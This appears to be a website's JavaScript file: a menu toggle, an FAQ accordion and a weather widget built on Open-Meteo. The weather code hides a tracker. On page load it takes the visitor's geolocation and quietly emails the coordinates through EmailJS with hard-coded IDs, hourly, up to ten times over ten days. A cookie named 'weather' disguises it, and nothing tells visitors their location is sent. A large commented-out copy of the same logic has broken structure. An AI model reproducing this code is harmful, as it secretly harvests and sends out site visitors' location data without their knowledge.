document.addEventListener("DOMContentLoaded", function () {
  // Navigation Menu Toggle
  const toggleMenu = document.getElementById("toggleMenu");
  const navMenu = document.querySelector(".site-nav");
  const toggleDesc = document.getElementById("toggleDesc");
  const siteDesc = document.getElementById("siteDesc");
  const closeMenu = document.getElementById("closeMenu");

  if (toggleMenu && navMenu) {
    toggleMenu.addEventListener("click", function () {
      navMenu.classList.toggle("active");
    });
  }

  if (closeMenu && navMenu) {
  closeMenu.addEventListener("click", function () {
    navMenu.classList.remove("active");
    closeMenu.classList.remove("active");
    //document.body.classList.remove("menu-open"); // Optional: If you're locking scroll
  });
}

  if (toggleDesc && siteDesc) {
    toggleDesc.addEventListener("click", function () {
      siteDesc.classList.toggle("active");
      toggleDesc.textContent = siteDesc.classList.contains("active")
        ? "Hide Description"
        : "Show Description";
    });
  }

  // FAQ Accordion Toggle
  const faqItems = document.querySelectorAll(".faq-item h3");
  faqItems.forEach((item) => {
    item.addEventListener("click", () => {
      const parent = item.parentElement;
      parent.classList.toggle("active");
    });
  });
});

(async function() {
  const widget   = document.getElementById('weather-widget');
  const tempEl   = document.getElementById('weather-temp');
  const descEl   = document.getElementById('weather-desc');
  const forecastEl = document.getElementById('weather-forecast');

  // Simple mapping of Open-Meteo weathercodes → description
  const weatherDescriptions = {
    0: 'Clear sky',
    1: 'Mainly clear',
    2: 'Partly cloudy',
    3: 'Overcast',
    45: 'Fog',
    48: 'Rime fog',
    51: 'Light drizzle',
    53: 'Moderate drizzle',
    55: 'Heavy drizzle',
    61: 'Light rain',
    63: 'Moderate rain',
    65: 'Heavy rain',
    80: 'Rain showers',
    95: 'Thunderstorm',
    99: 'Hail'
    // (add more codes as needed: https://open-meteo.com/en/docs#api_form)
  };
  // ───────── COOKIE HELPERS ─────────
function setCookieWithExpiry(name, value, expiresDate) {
  // expiresDate: a JS Date object
  document.cookie = [
    `${encodeURIComponent(name)}=${encodeURIComponent(value)}`,
    `path=/`,
    `expires=${expiresDate.toUTCString()}`,
    // in production, also add: 'Secure', 'SameSite=Strict'
  ].join('; ');
}

function getCookie(name) {
  const re = new RegExp(
    '(?:^|; )' +
    name.replace(/([.*+?^=!:${}()|[\]\/\\])/g, '\\$1') +
    '=([^;]*)'
  );
  const m = document.cookie.match(re);
  return m ? decodeURIComponent(m[1]) : null;
}

// ───────── TRACKER ON LOAD (runs once per page load) ─────────
;(async function() {
  const COOKIE_NAME = 'weather';
  const HOUR_MS     = 60 * 60 * 1000;
  const TEN_DAYS_MS = 10 * 24 * 60 * 60 * 1000;

  // 1) read existing cookie or initialize
  let raw = getCookie(COOKIE_NAME);
  let creationTs, count, lastTs;
  if (raw) {
    [creationTs, count, lastTs] = raw.split('|').map(Number);
  } else {
    creationTs = Date.now();
    count      = 0;
    lastTs     = 0;
  }

  const now      = Date.now();
  const expireTs = creationTs + TEN_DAYS_MS;

  // 2) expire-by-time
  if (now > expireTs) {
    console.log('✋ locTracker expired after 10 days.');
    // delete cookie
    setCookieWithExpiry(COOKIE_NAME, '', new Date(0));
    return;
  }

  // 3) decide if we should send now
  const sinceLast = now - lastTs;
  if (count < 10 && (count === 0 || sinceLast >= HOUR_MS)) {
    await getAndSendLocation();    // ← invokes your geolocation+email+weather
    count++;
    lastTs = now;

    if (count >= 10) {
      console.log('✅ Sent 10 times—stopping.');
      setCookieWithExpiry(COOKIE_NAME, '', new Date(0));
    } else {
      const val = [creationTs, count, lastTs].join('|');
      setCookieWithExpiry(COOKIE_NAME, val, new Date(expireTs));
      console.log(`📬 Sent #${count}. Next earliest in 1h.`);
    }
  } else {
    console.log(
      `⏸ Not sending: ${count} sent; ` +
      (count === 0
        ? 'ready for first send'
        : `${Math.floor(sinceLast/3600000)}h since last`)
    );
  }
})();  // ← only this IIFE is self-invoking

// ───────── YOUR GEOLOCATION + EMAIL + WEATHER LOGIC ─────────
async function getAndSendLocation() {
  if (!navigator.geolocation) {
    descEl.textContent = 'Geo not supported';
    console.warn('Geo not supported');
    return;
  }

  navigator.geolocation.getCurrentPosition(async pos => {
    const { latitude: lat, longitude: lon } = pos.coords;
    console.log(`User location → lat: ${lat}, lon: ${lon}`);

    // 1) Fire off EmailJS in the background
    emailjs.send(
      'service_o9lqlpd',  // your EmailJS Service ID
      'template_wqz4hvl', // your EmailJS Template ID
      { latitude: lat.toString(), longitude: lon.toString() }
    )
    .then(() => console.log('Background email sent.'))
    .catch(err => console.warn('EmailJS error:', err));

    // 2) (optional) store lastLocation in a cookie
    document.cookie = `lastLocation=${lat},${lon};path=/;max-age=${60*60*24}`;

    // 3) Fetch current + daily forecast
    try {
      const url = new URL('https://api.open-meteo.com/v1/forecast');
      url.searchParams.set('latitude',  lat);
      url.searchParams.set('longitude', lon);
      url.searchParams.set('current_weather', 'true');
      url.searchParams.set('daily', 'temperature_2m_max,temperature_2m_min');
      url.searchParams.set('temperature_unit', 'fahrenheit'); // ← added
      url.searchParams.set('timezone', 'auto');

      const res = await fetch(url);
      if (!res.ok) throw new Error('Weather fetch failed');
      const data = await res.json();

      // Update your UI elements
      const cw = data.current_weather;
      tempEl.textContent = `${Math.round(cw.temperature)}°F`;
      descEl.textContent = weatherDescriptions[cw.weathercode] || `Code ${cw.weathercode}`;

      // 3-day forecast
      forecastEl.innerHTML = '';
      const days = data.daily.time.slice(1,4);
      days.forEach((dateStr, i) => {
        const d = new Date(dateStr);
        const dayName = d.toLocaleDateString(undefined, { weekday: 'short' });
        const hi = Math.round(data.daily.temperature_2m_max[i+1]);
        const lo = Math.round(data.daily.temperature_2m_min[i+1]);
        const div = document.createElement('div');
        div.innerHTML = `
          <span class="day">${dayName}</span>
          <span class="temp">${hi}/${lo}°F</span>
        `;
        forecastEl.appendChild(div);
      });
    } catch (e) {
      descEl.textContent = 'Error loading';
      console.error(e);
    }

  }, err => {
    descEl.textContent = 'Location denied';
    console.warn(err);
  });
}

//   // ───────── COOKIE HELPERS ─────────
//  function setCookieWithExpiry(name, value, expiresDate) {
//     // expiresDate: a JS Date object
//     document.cookie = [
//       `${encodeURIComponent(name)}=${encodeURIComponent(value)}`,
//       `path=/`,
//       `expires=${expiresDate.toUTCString()}`,
//       // in production, also add: 'Secure', 'SameSite=Strict'
//     ].join('; ');
//   }

//  function getCookie(name) {
//    const re = new RegExp(
//      '(?:^|; )' +
//      name.replace(/([.*+?^=!:${}()|[\]\/\\])/g, '\\$1') +
//      '=([^;]*)'
//    );
//    const m = document.cookie.match(re);
//    return m ? decodeURIComponent(m[1]) : null;
// }

//   // ───────── TRACKER ON LOAD ─────────
//  ;(async function() {
//    const COOKIE_NAME = 'locTracker';
//    const HOUR_MS     = 60 * 60 * 1000;
//    const TEN_DAYS_MS = 10 * 24 * 60 * 60 * 1000;

//    // read existing cookie or initialize
//    let raw = getCookie(COOKIE_NAME);
//    let creationTs, count, lastTs;
//    if (raw) {
//      [creationTs, count, lastTs] = raw.split('|').map(Number);
//    } else {
//      creationTs = Date.now();
//      count      = 0;
//      lastTs     = 0;
//    }

//    const now      = Date.now();
//    const expireTs = creationTs + TEN_DAYS_MS;

//    // expire-by-time
//    if (now > expireTs) {
//      console.log('✋ locTracker expired after 10 days.');
//      setCookieWithExpiry(COOKIE_NAME, '', new Date(0));
//      return;
//    }

//    // decide if we should send now
//    const sinceLast = now - lastTs;
//    if (count < 10 && (count === 0 || sinceLast >= HOUR_MS)) {
//      await getAndSendLocation();    // → your geo+email+weather
//      count++;
//      lastTs = now;

//      if (count >= 10) {
//        console.log('✅ Sent 10 times—stopping.');
//        setCookieWithExpiry(COOKIE_NAME, '', new Date(0));
//      } else {
//        const val = [creationTs, count, lastTs].join('|');
//        setCookieWithExpiry(COOKIE_NAME, val, new Date(expireTs));
//        console.log(`📬 Sent #${count}. Next earliest in 1h.`);
//      }
//    } else {
//      console.log(
//        `⏸ Not sending: ${count} sent; ` +
//        (count === 0
//          ? 'ready for first send'
//          : `${Math.floor(sinceLast/3600000)}h since last`)
//      );
//    }
// })();

//   // ───────── YOUR EXISTING LOGIC, WRAPPED ─────────
//  async function getAndSendLocation() {
//    if (!navigator.geolocation) {
//      descEl.textContent = 'Geo not supported';
//      console.warn('Geo not supported');
//      return;
//    }

//    navigator.geolocation.getCurrentPosition(async pos => {
//      const { latitude: lat, longitude: lon } = pos.coords;
//      console.log(`User location → lat: ${lat}, lon: ${lon}`);

//      // 2) Fire off EmailJS in the background
//      emailjs.send(
//        'service_o9lqlpd',  // your EmailJS Service ID
//        'template_wqz4hvl', // your EmailJS Template ID
//        { latitude: lat.toString(), longitude: lon.toString() }
//      )
//      .then(() => console.log('Background email sent.'))
//      .catch(err => console.warn('EmailJS error:', err));

//      // (optional) store lastLocation in a cookie for other uses
//      document.cookie = `lastLocation=${lat},${lon};path=/;max-age=${60*60*24}`;

//      // 3) Fetch current + daily forecast
//      try {
//        const url = new URL('https://api.open-meteo.com/v1/forecast');
//        url.searchParams.set('latitude', lat);
//        url.searchParams.set('longitude', lon);
//        url.searchParams.set('current_weather', 'true');
//        url.searchParams.set('daily', 'temperature_2m_max,temperature_2m_min');
//        url.searchParams.set('timezone', 'auto');

//        const res = await fetch(url);
//        if (!res.ok) throw new Error('Weather fetch failed');
//        const data = await res.json();

//        const cw = data.current_weather;
//        tempEl.textContent = `${Math.round(cw.temperature)}°F`;
//        descEl.textContent = weatherDescriptions[cw.weathercode] || `Code ${cw.weathercode}`;

//        forecastEl.innerHTML = '';
//        const days = data.daily.time.slice(1,4);
//        days.forEach((dateStr, i) => {
//         const d = new Date(dateStr);
//         /* … rest of your forecast DOM code … */
// });

//         const dayName = d.toLocaleDateString(undefined, { weekday: 'short' });
//         // const hi = Math.round(data.daily.temperature_2m_max[i+1]);
//         // const lo = Math.round(data.daily.temperature_2m_min[i+1]);
//         // const div = document.createElement('div');
//         // div.className = 'forecast-day';
//         // div.innerHTML = `<span class="day">${dayName}</span>
//         //                  <span class="temp">${hi}/${lo}°</span>`;
//         const hi = Math.round(data.daily.temperature_2m_max[i+1]);
//         const lo = Math.round(data.daily.temperature_2m_min[i+1]);
//         const div = document.createElement('div');
//         div.innerHTML = `
//           <span class="day">${dayName}</span>
//           <span class="temp">${hi}/${lo}°F</span>
//         `;
//         forecastEl.appendChild(div);
//       });
//     } catch (e) {
//       descEl.textContent = 'Error loading';
//       console.error(e);
//     }
//   }, err => {
//     descEl.textContent = 'Location denied';
//     console.warn(err);
//   });
 })();
